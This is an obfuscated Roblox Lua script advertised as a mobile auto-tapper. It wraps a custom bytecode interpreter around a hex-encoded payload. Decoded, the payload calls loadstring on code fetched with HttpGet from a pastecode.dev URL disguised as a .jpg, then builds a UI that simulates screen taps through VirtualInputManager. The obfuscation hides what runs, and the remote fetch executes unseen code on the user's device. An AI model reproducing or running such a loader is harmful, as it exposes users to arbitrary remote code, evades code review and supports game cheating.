--[[
@lulaslollipop🍭 on RBX // diskord: @rrixh // telegram: https://t.me/sIipped
MADE FOR MOBILE ONLY ✅📱
❌💻🖥️❌
░█████╗░██╗░░░██╗████████╗░█████╗░
██╔══██╗██║░░░██║╚══██╔══╝██╔══██╗
███████║██║░░░██║░░░██║░░░██║░░██║
██╔══██║██║░░░██║░░░██║░░░██║░░██║
██║░░██║╚██████╔╝░░░██║░░░╚█████╔╝
╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░░╚════╝░

████████╗░█████╗░██████╗░
╚══██╔══╝██╔══██╗██╔══██╗
░░░██║░░░███████║██████╔╝
░░░██║░░░██╔══██║██╔═══╝░
░░░██║░░░██║░░██║██║░░░░░
░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░░░░

███╗░░░███╗░█████╗░██████╗░██╗██╗░░░░░███████╗
████╗░████║██╔══██╗██╔══██╗██║██║░░░░░██╔════╝
██╔████╔██║██║░░██║██████╦╝██║██║░░░░░█████╗░░
██║╚██╔╝██║██║░░██║██╔══██╗██║██║░░░░░██╔══╝░░
██║░╚═╝░██║╚█████╔╝██████╦╝██║███████╗███████╗
╚═╝░░░░░╚═╝░╚════╝░╚═════╝░╚═╝╚══════╝╚══════╝

██████╗░██╗░░░██╗
██╔══██╗╚██╗░██╔╝
██████╦╝░╚████╔╝░
██╔══██╗░░╚██╔╝░░
██████╦╝░░░██║░░░
╚═════╝░░░░╚═╝░░░

██████╗░██████╗░██╗██╗░░██╗██╗░░██╗
██╔══██╗██╔══██╗██║╚██╗██╔╝██║░░██║
██████╔╝██████╔╝██║░╚███╔╝░███████║
██╔══██╗██╔══██╗██║░██╔██╗░██╔══██║
██║░░██║██║░░██║██║██╔╝╚██╗██║░░██║
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═╝░░╚═╝╚═╝░░╚═╝

███╗░░██╗██╗░██████╗░░██████╗░░█████╗░
████╗░██║██║██╔════╝░██╔════╝░██╔══██╗
██╔██╗██║██║██║░░██╗░██║░░██╗░███████║
██║╚████║██║██║░░╚██╗██║░░╚██╗██╔══██║
██║░╚███║██║╚██████╔╝╚██████╔╝██║░░██║
╚═╝░░╚══╝╚═╝░╚═════╝░░╚═════╝░╚═╝░░╚═╝
enjoY
]]local lulaslollipop,rrixh={{},{},{},{},{},{},{}},[[kreator]];
local StrToNumber = tonumber;
local Byte = string.byte;
local Char = string.char;
local Sub = string.sub;
local Subg = string.gsub;
local Rep = string.rep;
local Concat = table.concat;
local Insert = table.insert;
local LDExp = math.ldexp;
local GetFEnv = getfenv or function()
	return _ENV;
end;
local Setmetatable = setmetatable;
local PCall = pcall;
local Select = select;
local Unpack = unpack or table.unpack;
local ToNumber = tonumber;
local function VMCall(ByteString, vmenv, ...)
	local DIP = 1;
	local repeatNext;
	ByteString = Subg(Sub(ByteString, 5), "..", function(byte)
		if (Byte(byte, 2) == 79) then
			repeatNext = StrToNumber(Sub(byte, 1, 1));
			return "";
		else
			local a = Char(StrToNumber(byte, 16));
			if repeatNext then
				local b = Rep(a, repeatNext);
				repeatNext = nil;
				return b;
			else
				return a;
			end
		end
	end);
	local function gBit(Bit, Start, End)
		if End then
			local Res = (Bit / (2 ^ (Start - 1))) % (2 ^ (((End - 1) - (Start - 1)) + 1));
			return Res - (Res % 1);
		else
			local Plc = 2 ^ (Start - 1);
			return (((Bit % (Plc + Plc)) >= Plc) and 1) or 0;
		end
	end
	local function gBits8()
		local a = Byte(ByteString, DIP, DIP);
		DIP = DIP + 1;
		return a;
	end
	local function gBits16()
		local a, b = Byte(ByteString, DIP, DIP + 2);
		DIP = DIP + 2;
		return (b * 256) + a;
	end
	local function gBits32()
		local a, b, c, d = Byte(ByteString, DIP, DIP + 3);
		DIP = DIP + 4;
		return (d * 16777216) + (c * 65536) + (b * 256) + a;
	end
	local function gFloat()
		local Left = gBits32();
		local Right = gBits32();
		local IsNormal = 1;
		local Mantissa = (gBit(Right, 1, 20) * (2 ^ 32)) + Left;
		local Exponent = gBit(Right, 21, 31);
		local Sign = ((gBit(Right, 32) == 1) and -1) or 1;
		if (Exponent == 0) then
			if (Mantissa == 0) then
				return Sign * 0;
			else
				Exponent = 1;
				IsNormal = 0;
			end
		elseif (Exponent == 2047) then
			return ((Mantissa == 0) and (Sign * (1 / 0))) or (Sign * NaN);
		end
		return LDExp(Sign, Exponent - 1023) * (IsNormal + (Mantissa / (2 ^ 52)));
	end
	local function gString(Len)
		local Str;
		if not Len then
			Len = gBits32();
			if (Len == 0) then
				return "";
			end
		end
		Str = Sub(ByteString, DIP, (DIP + Len) - 1);
		DIP = DIP + Len;
		local FStr = {};
		for Idx = 1, #Str do
			FStr[Idx] = Char(Byte(Sub(Str, Idx, Idx)));
		end
		return Concat(FStr);
	end
	local gInt = gBits32;
	local function _R(...)
		return {...}, Select("#", ...);
	end
	local function Deserialize()
		local Instrs = {};
		local Functions = {};
		local Lines = {};
		local Chunk = {Instrs,Functions,nil,Lines};
		local ConstCount = gBits32();
		local Consts = {};
		for Idx = 1, ConstCount do
			local Type = gBits8();
			local Cons;
			if (Type == 1) then
				Cons = gBits8() ~= 0;
			elseif (Type == 2) then
				Cons = gFloat();
			elseif (Type == 3) then
				Cons = gString();
			end
			Consts[Idx] = Cons;
		end
		Chunk[3] = gBits8();
		for Idx = 1, gBits32() do
			local Descriptor = gBits8();
			if (gBit(Descriptor, 1, 1) == 0) then
				local Type = gBit(Descriptor, 2, 3);
				local Mask = gBit(Descriptor, 4, 6);
				local Inst = {gBits16(),gBits16(),nil,nil};
				if (Type == 0) then
					Inst[3] = gBits16();
					Inst[4] = gBits16();
				elseif (Type == 1) then
					Inst[3] = gBits32();
				elseif (Type == 2) then
					Inst[3] = gBits32() - (2 ^ 16);
				elseif (Type == 3) then
					Inst[3] = gBits32() - (2 ^ 16);
					Inst[4] = gBits16();
				end
				if (gBit(Mask, 1, 1) == 1) then
					Inst[2] = Consts[Inst[2]];
				end
				if (gBit(Mask, 2, 2) == 1) then
					Inst[3] = Consts[Inst[3]];
				end
				if (gBit(Mask, 3, 3) == 1) then
					Inst[4] = Consts[Inst[4]];
				end
				Instrs[Idx] = Inst;
			end
		end
		for Idx = 1, gBits32() do
			Functions[Idx - 1] = Deserialize();
		end
		return Chunk;
	end
	local function Wrap(Chunk, Upvalues, Env)
		local Instr = Chunk[1];
		local Proto = Chunk[2];
		local Params = Chunk[3];
		return function(...)
			local Instr = Instr;
			local Proto = Proto;
			local Params = Params;
			local _R = _R;
			local VIP = 1;
			local Top = -1;
			local Vararg = {};
			local Args = {...};
			local PCount = Select("#", ...) - 1;
			local Lupvals = {};
			local Stk = {};
			for Idx = 0, PCount do
				if (Idx >= Params) then
					Vararg[Idx - Params] = Args[Idx + 1];
				else
					Stk[Idx] = Args[Idx + 1];
				end
			end
			local Varargsz = (PCount - Params) + 1;
			local Inst;
			local Enum;
			while true do
				Inst = Instr[VIP];
				Enum = Inst[1];
				if (Enum <= 27) then
					if (Enum <= 13) then
						if (Enum <= 6) then
							if (Enum <= 2) then
								if (Enum <= 0) then
									Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
								elseif (Enum == 1) then
									local A = Inst[2];
									Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
								else
									local A = Inst[2];
									Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
								end
							elseif (Enum <= 4) then
								if (Enum > 3) then
									if Stk[Inst[2]] then
										VIP = VIP + 1;
									else
										VIP = Inst[3];
									end
								else
									Stk[Inst[2]] = Upvalues[Inst[3]];
								end
							elseif (Enum > 5) then
								Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
							else
								local A = Inst[2];
								local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
								Top = (Limit + A) - 1;
								local Edx = 0;
								for Idx = A, Top do
									Edx = Edx + 1;
									Stk[Idx] = Results[Edx];
								end
							end
						elseif (Enum <= 9) then
							if (Enum <= 7) then
								Stk[Inst[2]] = Stk[Inst[3]];
							elseif (Enum == 8) then
								Stk[Inst[2]][Inst[3]] = Inst[4];
							else
								do
									return;
								end
							end
						elseif (Enum <= 11) then
							if (Enum == 10) then
								if not Stk[Inst[2]] then
									VIP = VIP + 1;
								else
									VIP = Inst[3];
								end
							elseif not Stk[Inst[2]] then
								VIP = VIP + 1;
							else
								VIP = Inst[3];
							end
						elseif (Enum > 12) then
							local A = Inst[2];
							Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
						else
							local A = Inst[2];
							local B = Stk[Inst[3]];
							Stk[A + 1] = B;
							Stk[A] = B[Inst[4]];
						end
					elseif (Enum <= 20) then
						if (Enum <= 16) then
							if (Enum <= 14) then
								Stk[Inst[2]] = {};
							elseif (Enum > 15) then
								if (Stk[Inst[2]] == Stk[Inst[4]]) then
									VIP = VIP + 1;
								else
									VIP = Inst[3];
								end
							else
								for Idx = Inst[2], Inst[3] do
									Stk[Idx] = nil;
								end
							end
						elseif (Enum <= 18) then
							if (Enum == 17) then
								local A = Inst[2];
								Stk[A] = Stk[A](Stk[A + 1]);
							else
								local A = Inst[2];
								local B = Stk[Inst[3]];
								Stk[A + 1] = B;
								Stk[A] = B[Inst[4]];
							end
						elseif (Enum > 19) then
							Stk[Inst[2]] = Env[Inst[3]];
						else
							Stk[Inst[2]] = Stk[Inst[3]];
						end
					elseif (Enum <= 23) then
						if (Enum <= 21) then
							local A = Inst[2];
							local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
							Top = (Limit + A) - 1;
							local Edx = 0;
							for Idx = A, Top do
								Edx = Edx + 1;
								Stk[Idx] = Results[Edx];
							end
						elseif (Enum > 22) then
							Stk[Inst[2]][Inst[3]] = Inst[4];
						else
							local A = Inst[2];
							Stk[A](Stk[A + 1]);
						end
					elseif (Enum <= 25) then
						if (Enum == 24) then
							Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
						else
							for Idx = Inst[2], Inst[3] do
								Stk[Idx] = nil;
							end
						end
					elseif (Enum == 26) then
						local A = Inst[2];
						Stk[A] = Stk[A](Stk[A + 1]);
					else
						local A = Inst[2];
						Stk[A] = Stk[A]();
					end
				elseif (Enum <= 41) then
					if (Enum <= 34) then
						if (Enum <= 30) then
							if (Enum <= 28) then
								Stk[Inst[2]] = Upvalues[Inst[3]];
							elseif (Enum == 29) then
								local B = Inst[3];
								local K = Stk[B];
								for Idx = B + 1, Inst[4] do
									K = K .. Stk[Idx];
								end
								Stk[Inst[2]] = K;
							else
								local A = Inst[2];
								Stk[A](Unpack(Stk, A + 1, Inst[3]));
							end
						elseif (Enum <= 32) then
							if (Enum == 31) then
								local A = Inst[2];
								Stk[A] = Stk[A]();
							elseif (Stk[Inst[2]] ~= Stk[Inst[4]]) then
								VIP = VIP + 1;
							else
								VIP = Inst[3];
							end
						elseif (Enum > 33) then
							Stk[Inst[2]] = Inst[3];
						else
							do
								return;
							end
						end
					elseif (Enum <= 37) then
						if (Enum <= 35) then
							VIP = Inst[3];
						elseif (Enum > 36) then
							local A = Inst[2];
							Stk[A](Unpack(Stk, A + 1, Inst[3]));
						else
							local NewProto = Proto[Inst[3]];
							local NewUvals;
							local Indexes = {};
							NewUvals = Setmetatable({}, {__index=function(_, Key)
								local Val = Indexes[Key];
								return Val[1][Val[2]];
							end,__newindex=function(_, Key, Value)
								local Val = Indexes[Key];
								Val[1][Val[2]] = Value;
							end});
							for Idx = 1, Inst[4] do
								VIP = VIP + 1;
								local Mvm = Instr[VIP];
								if (Mvm[1] == 19) then
									Indexes[Idx - 1] = {Stk,Mvm[3]};
								else
									Indexes[Idx - 1] = {Upvalues,Mvm[3]};
								end
								Lupvals[#Lupvals + 1] = Indexes;
							end
							Stk[Inst[2]] = Wrap(NewProto, NewUvals, Env);
						end
					elseif (Enum <= 39) then
						if (Enum == 38) then
							local B = Inst[3];
							local K = Stk[B];
							for Idx = B + 1, Inst[4] do
								K = K .. Stk[Idx];
							end
							Stk[Inst[2]] = K;
						else
							local A = Inst[2];
							Stk[A](Stk[A + 1]);
						end
					elseif (Enum > 40) then
						Upvalues[Inst[3]] = Stk[Inst[2]];
					else
						Stk[Inst[2]] = Env[Inst[3]];
					end
				elseif (Enum <= 48) then
					if (Enum <= 44) then
						if (Enum <= 42) then
							Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
						elseif (Enum > 43) then
							local A = Inst[2];
							Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
						else
							Stk[Inst[2]]();
						end
					elseif (Enum <= 46) then
						if (Enum > 45) then
							if (Stk[Inst[2]] ~= Stk[Inst[4]]) then
								VIP = VIP + 1;
							else
								VIP = Inst[3];
							end
						else
							Stk[Inst[2]] = {};
						end
					elseif (Enum == 47) then
						Stk[Inst[2]] = Inst[3] ~= 0;
					else
						Stk[Inst[2]]();
					end
				elseif (Enum <= 51) then
					if (Enum <= 49) then
						Stk[Inst[2]] = Inst[3] ~= 0;
					elseif (Enum > 50) then
						if (Stk[Inst[2]] == Stk[Inst[4]]) then
							VIP = VIP + 1;
						else
							VIP = Inst[3];
						end
					elseif Stk[Inst[2]] then
						VIP = VIP + 1;
					else
						VIP = Inst[3];
					end
				elseif (Enum <= 53) then
					if (Enum == 52) then
						VIP = Inst[3];
					else
						Upvalues[Inst[3]] = Stk[Inst[2]];
					end
				elseif (Enum == 54) then
					Stk[Inst[2]] = Inst[3];
				else
					local NewProto = Proto[Inst[3]];
					local NewUvals;
					local Indexes = {};
					NewUvals = Setmetatable({}, {__index=function(_, Key)
						local Val = Indexes[Key];
						return Val[1][Val[2]];
					end,__newindex=function(_, Key, Value)
						local Val = Indexes[Key];
						Val[1][Val[2]] = Value;
					end});
					for Idx = 1, Inst[4] do
						VIP = VIP + 1;
						local Mvm = Instr[VIP];
						if (Mvm[1] == 19) then
							Indexes[Idx - 1] = {Stk,Mvm[3]};
						else
							Indexes[Idx - 1] = {Upvalues,Mvm[3]};
						end
						Lupvals[#Lupvals + 1] = Indexes;
					end
					Stk[Inst[2]] = Wrap(NewProto, NewUvals, Env);
				end
				VIP = VIP + 1;
			end
		end;
	end
	return Wrap(Deserialize(), {}, vmenv)(...);
end
return VMCall("LOL!153O00030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403323O00682O7470733A2O2F7061737465636F64652E6465762F7261772F6F353739787438362F6D6F62696C6557612O6C792E6A706703123O006C756C61736C6F2O6C69706F7020F09F8DAD030A3O004765745365727669636503123O004D61726B6574706C61636553657276696365030E3O0047657450726F64756374496E666F03073O00506C616365496403043O004E616D65030C3O0043726561746557696E646F7703063O00412O64426F7803043O0074657874030D3O004175746F5461702053702O656403083O0063612O6C6261636B03093O00412O6442752O746F6E03103O005365742054617020506F736974696F6E03093O00412O64546F2O676C65030F3O004175746F20536B722O656E2054617003093O00412O64466F6C64657203043O00496E697400393O0012143O00013O001214000100023O00200C000100010003001222000300044O002F000400014O0005000100044O002C5O00022O001F3O00010002001222000100053O001214000200023O00200C000200020006001222000400074O000200020004000200200C000200020008001214000400023O00202O0004000400092O000200020004000200202O00020002000A00200C00033O000B2O0007000500024O00020003000500022O002F00046O000F000500083O00200C00090003000C2O000E000B3O0002003008000B000D000E000637000C3O000100012O00133O00083O001018000B000F000C2O00250009000B000100063700090001000100022O00133O00064O00133O00073O00200C000A000300102O000E000C3O0002003008000C000D0011000637000D0002000100012O00133O00093O001018000C000F000D2O0025000A000C000100200C000A000300122O000E000C3O0002003008000C000D0013000637000D0003000100052O00133O00044O00133O00054O00133O00064O00133O00074O00133O00083O001018000C000F000D2O0025000A000C000100200C000A000300142O0007000C00014O0025000A000C000100200C000A3O00152O0016000A000200012O00213O00013O00043O000E3O0003083O00746F6E756D62657203043O0067616D65030A3O005374617274657247756903073O00536574436F726503103O0053656E644E6F74696669636174696F6E03053O005469746C6503093O0053702O65642053657403043O0054657874030B3O005461702053702O65643A2003083O002073656B6F6E647303083O004475726174696F6E026O00084003053O00452O726F7203123O00496E76616C6964205461702053702O656421011F3O001214000100014O000700026O001A0001000200022O002900016O001C00015O0006040001001500013O0004343O00150001001214000100023O00202O00010001000300200C000100010004001222000300054O000E00043O0003003008000400060007001222000500094O001C00065O0012220007000A4O00260005000500070010180004000800050030080004000B000C2O00250001000400010004343O001E0001001214000100023O00202O00010001000300200C000100010004001222000300054O000E00043O000300300800040006000D00300800040008000E0030080004000B000C2O00250001000400012O00213O00017O00053O0003043O0067616D65030A3O004765745365727669636503103O0055736572496E70757453657276696365030A3O00496E707574426567616E03073O00436F2O6E65637400104O002F8O000F000100013O001214000200013O00200C000200020002001222000400034O000200020004000200202O00020002000400200C00020002000500063700043O000100042O00138O00038O00033O00014O00133O00014O00020002000400022O0007000100024O00213O00013O00013O00133O00030D3O0055736572496E7075745479706503043O00456E756D03053O00546F756368030C3O004D6F75736542752O746F6E3103083O00506F736974696F6E03013O005803013O005903043O0067616D65030A3O005374617274657247756903073O00536574436F726503103O0053656E644E6F74696669636174696F6E03053O005469746C65030C3O00506F736974696F6E2053657403043O00546578742O033O00583A2003053O002C20593A2003083O004475726174696F6E026O000840030A3O00446973636F2O6E656374012A4O001C00015O0006040001002700013O0004343O0027000100202O00013O0001001214000200023O00202O00020002000100202O00020002000300062E0001000F000100020004343O000F000100202O00013O0001001214000200023O00202O00020002000100202O00020002000400061000010029000100020004343O0029000100202O00013O000500202O0001000100062O0029000100013O00202O00013O000500202O0001000100072O0029000100023O001214000100083O00202O00010001000900200C00010001000A0012220003000B4O000E00043O00030030080004000C000D0012220005000F4O001C000600013O001222000700104O001C000800024O00260005000500080010180004000E00050030080004001100122O00250001000400012O001C000100033O00200C0001000100132O00160001000200010004343O002900012O002F000100014O002900016O00213O00017O000A3O0003043O0067616D65030A3O005374617274657247756903073O00536574436F726503103O0053656E644E6F74696669636174696F6E03053O005469746C6503103O005365742054617020506F736974696F6E03043O0054657874032E3O0054617020616E797768657265206F6E2074686520736B722O656E20746F207365742074686520706F736974696F6E03083O004475726174696F6E026O001440000C3O0012143O00013O00206O000200200C5O0003001222000200044O000E00033O000300300800030005000600300800030007000800300800030009000A2O00253O000300012O001C8O00303O000100012O00213O00017O00063O0003043O0067616D65030A3O0047657453657276696365030A3O0052756E53657276696365030D3O0052656E6465725374652O70656403073O00436F2O6E656374030A3O00446973636F2O6E65637401184O00298O001C00015O0006040001001100013O0004343O00110001001214000100013O00200C000100010002001222000300034O000200010003000200202O00010001000400200C00010001000500063700033O000100032O00033O00024O00033O00034O00033O00044O00020001000300022O0029000100013O0004343O001700012O001C000100013O0006040001001700013O0004343O001700012O001C000100013O00200C0001000100062O00160001000200012O00213O00013O00013O00103O0003043O0067616D65030A3O004765745365727669636503133O005669727475616C496E7075744D616E6167657203143O0053656E644D6F75736542752O746F6E4576656E74028O0003043O0077616974029A5O99B93F030A3O005374617274657247756903073O00536574436F726503103O0053656E644E6F74696669636174696F6E03053O005469746C6503053O00452O726F7203043O005465787403163O005365742076616C6964206B2O6F7264696E617465732103083O004475726174696F6E027O0040002F4O001C7O0006043O002500013O0004343O002500012O001C3O00013O0006043O002500013O0004343O002500010012143O00013O00200C5O0002001222000200034O00023O0002000200200C5O00042O001C00026O001C000300013O001222000400054O002F000500013O001214000600013O001222000700054O00253O000700010012143O00013O00200C5O0002001222000200034O00023O0002000200200C5O00042O001C00026O001C000300013O001222000400054O002F00055O001214000600013O001222000700054O00253O000700010012143O00064O001C000100023O00060A00010023000100010004343O00230001001222000100074O00163O000200010004343O002E00010012143O00013O00206O000800200C5O00090012220002000A4O000E00033O00030030080003000B000C0030080003000D000E0030080003000F00102O00253O000300012O00213O00017O00", GetFEnv(), ...);
